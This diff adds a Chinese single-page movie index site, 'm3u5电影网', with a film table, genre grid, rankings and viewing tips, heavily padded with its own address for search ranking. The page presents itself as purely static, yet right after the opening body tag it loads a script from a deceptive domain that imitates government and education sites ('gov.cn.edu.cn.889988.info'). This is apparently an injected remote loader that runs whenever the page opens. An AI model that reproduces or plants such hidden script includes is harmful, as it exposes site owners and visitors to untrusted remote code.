@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>m3u5电影网 - 电影索引清单/电影片单检索/在线选片导航（访问地址：https://m3u5dianyingwang-top.github.io）</title>
+<meta name="keywords" content="m3u5电影网, 电影索引清单, 电影片单检索, 电影在线选片, 电影分类导航, 热门电影排行榜, 电影播放列表推荐, m3u5dianyingwang-top.github.io">
+<meta name="description" content="m3u5电影网（访问地址：https://m3u5dianyingwang-top.github.io）以索引清单的方式整理电影片单，提供电影检索、类型分类、热门榜单与选片指南。页面为静态终端风格、移动端自适应，帮您快速定位想看的电影。">
+<link rel="canonical" href="https://m3u5dianyingwang-top.github.io">
+<meta property="og:title" content="m3u5电影网 - 电影索引清单与片单检索站">
+<meta property="og:description" content="电影检索、类型分类、热门榜单与选片指南，访问地址 https://m3u5dianyingwang-top.github.io。">
+<meta property="og:url" content="https://m3u5dianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="m3u5电影网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="m3u5电影网 - 电影索引清单与片单检索站">
+<meta name="twitter:description" content="电影检索、类型分类、热门榜单与选片指南，访问地址 m3u5dianyingwang-top.github.io。">
+<style>
+:root{
+  --bg:#0b0f0c;
+  --bg2:#111712;
+  --term:#0d140f;
+  --green:#39ff8b;
+  --green-d:#1ec964;
+  --amber:#ffcf3a;
+  --dim:#7fe3ab;
+  --ink:#e7f6ec;
+  --muted:#7d9685;
+  --line:rgba(57,255,139,.35);
+  --shadow:0 16px 40px rgba(0,0,0,.5);
+  --mono:"SFMono-Regular",Consolas,"Liberation Mono","Courier New",monospace;
+  --sans:"PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:var(--mono);color:var(--ink);background:var(--bg);line-height:1.85;padding:16px;
+  background-image:
+    repeating-linear-gradient(0deg,transparent 0 2px,rgba(57,255,139,.035) 2px 3px),
+    radial-gradient(900px 340px at 82% -120px,rgba(57,255,139,.12),transparent 58%),
+    radial-gradient(700px 260px at 4% 4%,rgba(255,207,58,.07),transparent 55%);
+}
+a{color:var(--green);text-decoration:none;transition:.15s}
+a:hover{color:var(--amber);text-shadow:0 0 8px rgba(255,207,58,.5)}
+.container{max-width:1160px;margin:0 auto}
+::selection{background:var(--green);color:var(--bg)}
+
+/* 终端窗口 */
+.win{background:var(--term);border:1px solid var(--line);border-radius:8px;box-shadow:var(--shadow);overflow:hidden;margin-bottom:18px}
+.bar{display:flex;align-items:center;gap:8px;padding:9px 14px;background:linear-gradient(180deg,#1a231d,#111a14);border-bottom:1px solid var(--line)}
+.dot{width:11px;height:11px;border-radius:50%;background:#ff5f57}.dot:nth-child(2){background:#febc2e}.dot:nth-child(3){background:#28c840}
+.bar .path{flex:1;text-align:center;font-size:12px;color:var(--muted);letter-spacing:1px}
+.screen{padding:20px 22px;font-size:14px}
+.prompt{color:var(--amber)}
+.cmd{color:var(--green)}
+.out{color:var(--ink)}
+.mut{color:var(--muted)}
+.cursor{display:inline-block;width:8px;height:15px;background:var(--green);vertical-align:middle;animation:blink 1s steps(2) infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* 导航条 */
+.nav{display:flex;gap:8px;flex-wrap:wrap;padding:4px 0}
+.nav a{
+  font-family:var(--mono);font-size:13px;color:var(--ink);padding:8px 15px;background:rgba(57,255,139,.06);
+  border:1px solid var(--line);border-radius:4px;min-height:44px;display:inline-flex;align-items:center;
+}
+.nav a:hover{background:var(--green);color:var(--bg);box-shadow:0 0 12px rgba(57,255,139,.45)}
+
+/* Hero 终端 */
+.hero{
+  position:relative;overflow:hidden;padding:56px 34px;margin-bottom:28px;
+  background:radial-gradient(700px 300px at 82% 8%,rgba(57,255,139,.14),transparent 60%),linear-gradient(160deg,var(--bg2),var(--bg));
+  border:1px solid var(--line);border-radius:8px;box-shadow:var(--shadow);
+}
+.hero h1{font-size:clamp(26px,5.6vw,46px);font-weight:700;line-height:1.3;margin:6px 0 14px;color:var(--green)}
+.hero h1 .hi{color:var(--amber)}
+.hero p{max-width:660px;color:var(--dim);margin-bottom:16px}
+.hero .quote{border-left:3px solid var(--amber);padding:10px 18px;margin-bottom:16px;color:var(--amber);background:rgba(255,207,58,.06);max-width:660px}
+.urlbox{display:inline-block;font-family:var(--mono);font-weight:700;background:var(--bg);color:var(--green);padding:11px 15px;border:1px dashed var(--line);border-radius:4px}
+.urlbox a{color:var(--amber)}
+.btn{display:inline-block;margin-top:16px;font-family:var(--mono);font-size:14px;font-weight:700;color:var(--bg);background:var(--green);padding:12px 30px;border:1px solid var(--green);border-radius:4px}
+.btn:hover{background:var(--amber);color:var(--bg);box-shadow:0 0 14px rgba(255,207,58,.5)}
+
+/* 栏目 */
+.section{padding:28px 0}
+.stitle{font-family:var(--mono);font-size:18px;font-weight:700;color:var(--green);margin-bottom:18px}
+.stitle::before{content:"// ";color:var(--amber)}
+.stitle.a::before{content:">>> "}
+
+/* 表格 */
+.tbl{width:100%;border-collapse:collapse;background:var(--term);border:1px solid var(--line);border-radius:6px;overflow:hidden;font-size:14px}
+.tbl th,.tbl td{padding:13px 14px;text-align:left;border-bottom:1px solid rgba(57,255,139,.18);vertical-align:top}
+.tbl th{background:rgba(57,255,139,.1);color:var(--amber);font-weight:700;letter-spacing:1px}
+.tbl tr:last-child td{border-bottom:0}
+.tbl tr:hover{background:rgba(57,255,139,.05)}
+.idx{color:var(--amber);font-weight:700}
+.title{color:var(--ink)}
+.title small{display:block;color:var(--muted);font-size:12px;margin-top:2px}
+.tag{display:inline-block;font-size:12px;color:var(--bg);background:var(--green);padding:2px 9px;border-radius:3px;font-weight:700}
+.score{color:var(--amber);font-weight:700}
+
+/* 分类 */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.node{border:1px solid var(--line);border-left:3px solid var(--amber);border-radius:4px;padding:16px;background:var(--term);transition:.2s}
+.node .ic{color:var(--green);font-size:18px;display:block;margin-bottom:5px}
+.node b{display:block;font-size:14px;margin-bottom:3px}
+.node span{font-size:12px;color:var(--muted)}
+.node:hover{background:rgba(57,255,139,.08);transform:translateY(-3px)}
+
+/* 榜单 */
+.rank{background:var(--term);border:1px solid var(--line);border-radius:6px;padding:22px}
+.rrow{display:flex;gap:16px;align-items:center;padding:13px 0;border-bottom:1px dashed rgba(57,255,139,.22)}
+.rrow:last-child{border-bottom:0}
+.rno{font-family:var(--mono);font-size:18px;font-weight:700;min-width:44px;color:var(--amber)}
+.rbody{flex:1}
+.rbody h3{font-size:16px;color:var(--ink)}
+.rbody small{font-size:12px;color:var(--muted)}
+.scorebox{font-family:var(--mono);font-weight:700;color:var(--bg);background:var(--green);padding:4px 11px;border-radius:3px}
+
+/* 贴士 */
+.tips{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.tip{border:1px solid var(--line);border-radius:6px;padding:18px;background:var(--term)}
+.tip h3{font-size:15px;color:var(--amber);margin-bottom:7px}
+.tip p{font-size:14px;color:var(--dim)}
+
+/* 关于 */
+.about{background:var(--term);border:1px solid var(--line);border-radius:8px;padding:40px 26px;text-align:center}
+.about h2{font-family:var(--mono);font-size:22px;color:var(--green);margin-bottom:14px}
+.about p{max-width:740px;margin:0 auto 16px;color:var(--dim)}
+.about .urlbox{background:var(--bg);border-color:var(--amber)}
+
+/* 页脚 */
+.footer{margin-top:28px;padding:22px 0;border-top:1px dashed var(--line)}
+.flinks{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:14px}
+.flinks a{font-family:var(--mono);font-size:13px;padding:9px 15px;color:var(--ink);background:var(--term);border:1px solid var(--line);border-radius:4px;min-height:44px;display:inline-flex;align-items:center}
+.flinks a:hover{background:var(--green);color:var(--bg)}
+.copy{font-family:var(--mono);font-size:12px;color:var(--muted);line-height:1.9;text-align:center}
+.copy a{color:var(--green)}
+
+@media(max-width:1024px){.grid4{grid-template-columns:repeat(2,1fr)}.tips{grid-template-columns:repeat(2,1fr)}.tbl .col-score,.tbl .col-tag{display:none}}
+@media(max-width:768px){
+  body{padding:10px}
+  .screen{padding:16px}
+  .hero{padding:36px 20px}
+  .grid4,.tips{grid-template-columns:1fr}
+  .tbl th,.tbl td{padding:10px}
+  .about{padding:30px 18px}
+  .rrow{flex-wrap:wrap}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="container">
+
+  <div class="win">
+    <div class="bar">
+      <span class="dot"></span><span class="dot"></span><span class="dot"></span>
+      <div class="path">~/m3u5/film/list — m3u5电影网</div>
+    </div>
+    <div class="screen">
+      <div><span class="prompt">$</span> <span class="cmd">cat</span> <span class="out">/etc/site/info.txt</span></div>
+      <div class="mut"># m3u5电影网 · 电影索引清单与片单检索站</div>
+      <div class="mut"># status: online | mode: static-index | lang: zh-CN</div>
+      <div><span class="prompt">$</span> <span class="mut">正在加载片单</span><span class="cursor"></span></div>
+    </div>
+  </div>
+
+  <nav class="nav">
+    <a href="#list"># 片单列表</a>
+    <a href="#cat"># 类型索引</a>
+    <a href="#rank"># 热门榜</a>
+    <a href="#guide"># 选片指南</a>
+    <a href="#about"># 关于本站</a>
+  </nav>
+
+  <section class="hero">
+    <div class="mut">// session started · 2024</div>
+    <h1><span class="prompt">$</span> open <span class="hi">m3u5电影网</span></h1>
+    <p>把电影整理成一张可以检索的索引清单：热门新片、类型分类、高分榜单与选片指南，一屏查完。m3u5电影网不做花哨包装，只帮你快速定位“现在想看哪一部”。</p>
+    <div class="quote">“检索的意义不是给你更多，而是在很多选择里，给你一个确定的入口。”——m3u5电影网编辑部</div>
+    <div class="urlbox">访问地址：<a href="https://m3u5dianyingwang-top.github.io">https://m3u5dianyingwang-top.github.io</a></div>
+    <br>
+    <a href="#" class="btn">$ ./start_select.sh #</a>
+  </section>
+
+  <section id="list" class="section">
+    <div class="stitle">片单列表 · playlist.list</div>
+    <table class="tbl">
+      <thead>
+        <tr>
+          <th style="width:90px">INDEX</th>
+          <th>TITLE / NOTE</th>
+          <th class="col-tag" style="width:120px">GENRE</th>
+          <th class="col-score" style="width:90px">SCORE</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="idx">001</td>
+          <td class="title"><a href="#">《追光的人》</a><small>剧情 / 励志，一个总在替别人拍照的人，终于走进了自己的镜头。</small></td>
+          <td class="col-tag"><span class="tag">剧情</span></td>
+          <td class="col-score score">9.5</td>
+        </tr>
+        <tr>
+          <td class="idx">002</td>
+          <td class="title"><a href="#">《倒数七秒》</a><small>科幻 / 悬疑，记忆只能保存七秒，他靠记号找出被抹掉的真相。</small></td>
+          <td class="col-tag"><span class="tag">科幻</span></td>
+          <td class="col-score score">9.2</td>
+        </tr>
+        <tr>
+          <td class="idx">003</td>
+          <td class="title"><a href="#">《周末花店》</a><small>治愈 / 爱情，一束束花替老板和常客说完了没说出口的话。</small></td>
+          <td class="col-tag"><span class="tag">治愈</span></td>
+          <td class="col-score score">9.0</td>
+        </tr>
+        <tr>
+          <td class="idx">004</td>
+          <td class="title"><a href="#">《夜班便利店》</a><small>都市 / 悬疑，两个值夜班的人在凌晨三点聊出一段关系。</small></td>
+          <td class="col-tag"><span class="tag">悬疑</span></td>
+          <td class="col-score score">8.9</td>
+        </tr>
+        <tr>
+          <td class="idx">005</td>
+          <td class="title"><a href="#">《再跑一圈》</a><small>运动 / 励志，中年跑者的最后一场马拉松。</small></td>
+          <td class="col-tag"><span class="tag">励志</span></td>
+          <td class="col-score score">8.7</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="cat" class="section">
+    <div class="stitle a">类型索引 · genre.tree</div>
+    <div class="grid4">
+      <a href="#" class="node"><span class="ic">▸</span><b>动作冒险</b><span>枪战 / 追车 / 探险</span></a>
+      <a href="#" class="node"><span class="ic">▸</span><b>悬疑推理</b><span>犯罪 / 烧脑</span></a>
+      <a href="#" class="node"><span class="ic">▸</span><b>科幻惊悚</b><span>太空 / AI / 未来</span></a>
+      <a href="#" class="node"><span class="ic">▸</span><b>浪漫爱情</b><span>青春 / 都市</span></a>
+      <a href="#" class="node"><span class="ic">▸</span><b>爆笑喜剧</b><span>合家 / 轻喜剧</span></a>
+      <a href="#" class="node"><span class="ic">▸</span><b>治愈生活</b><span>美食 / 自然</span></a>
+      <a href="#" class="node"><span class="ic">▸</span><b>剧情文艺</b><span>人物 / 社会</span></a>
+      <a href="#" class="node"><span class="ic">▸</span><b>经典高分</b><span>影史 / 修复</span></a>
+    </div>
+  </section>
+
+  <section id="rank" class="section">
+    <div class="stitle">热门榜 · top.track</div>
+    <div class="rank">
+      <div class="rrow">
+        <div class="rno">01</div>
+        <div class="rbody"><h3><a href="#">《肖申克的救赎》</a></h3><small>剧情 / 希望 · 长尾常青，讨论度持续靠前</small></div>
+        <div class="scorebox">9.7</div>
+      </div>
+      <div class="rrow">
+        <div class="rno">02</div>
+        <div class="rbody"><h3><a href="#">《星际穿越》</a></h3><small>科幻 / 亲情 · 反复刷看的硬科幻</small></div>
+        <div class="scorebox">9.4</div>
+      </div>
+      <div class="rrow">
+        <div class="rno">03</div>
+        <div class="rbody"><h3><a href="#">《追光的人》</a></h3><small>剧情励志 · 本周新片热度第一</small></div>
+        <div class="scorebox">9.5</div>
+      </div>
+      <div class="rrow">
+        <div class="rno">04</div>
+        <div class="rbody"><h3><a href="#">《倒数七秒》</a></h3><small>科幻悬疑 · 反转密集</small></div>
+        <div class="scorebox">9.2</div>
+      </div>
+      <div class="rrow">
+        <div class="rno">05</div>
+        <div class="rbody"><h3><a href="#">《周末花店》</a></h3><small>治愈爱情 · 口碑发酵</small></div>
+        <div class="scorebox">9.0</div>
+      </div>
+    </div>
+  </section>
+
+  <section id="guide" class="section">
+    <div class="stitle a">选片指南 · howto.md</div>
+    <div class="tips">
+      <div class="tip"><h3>01. 先定情绪，再定类型</h3><p>想提神选动作悬疑，想动脑选科幻推理，想放松选治愈爱情，情绪对了才看得下去。</p></div>
+      <div class="tip"><h3>02. 看时长，配时间</h3><p>通勤选 90 分钟左右的轻片，周末才有心情看长片；悬疑片建议一次看完。</p></div>
+      <div class="tip"><h3>03. 认准访问地址</h3><p>收藏 m3u5电影网访问地址，避开仿冒或广告过多的站点。</p></div>
+    </div>
+  </section>
+
+  <section id="about" class="section">
+    <div class="about">
+      <h2>// 关于 m3u5电影网</h2>
+      <p>m3u5电影网是一个以索引清单方式整理电影的单页站点：提供片单列表、类型索引、热门榜单与选片指南。页面为纯静态，便于快速打开与搜索引擎收录，不提供盗播，仅作选片参考。</p>
+      <p>访问地址：</p>
+      <div class="urlbox">https://<a href="https://m3u5dianyingwang-top.github.io">m3u5dianyingwang-top.github.io</a></div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="flinks">
+      <a href="#"># 首页</a>
+      <a href="#"># 免责声明</a>
+      <a href="#"># 片源合作</a>
+      <a href="#"># 留言反馈</a>
+    </div>
+    <div class="copy">
+      Copyright © 2024 m3u5电影网｜关键词：m3u5电影网<br>
+      访问地址：<a href="https://m3u5dianyingwang-top.github.io">https://m3u5dianyingwang-top.github.io</a><br>
+      本页仅作电影推荐与导航示例，实际观看请使用正版平台。
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
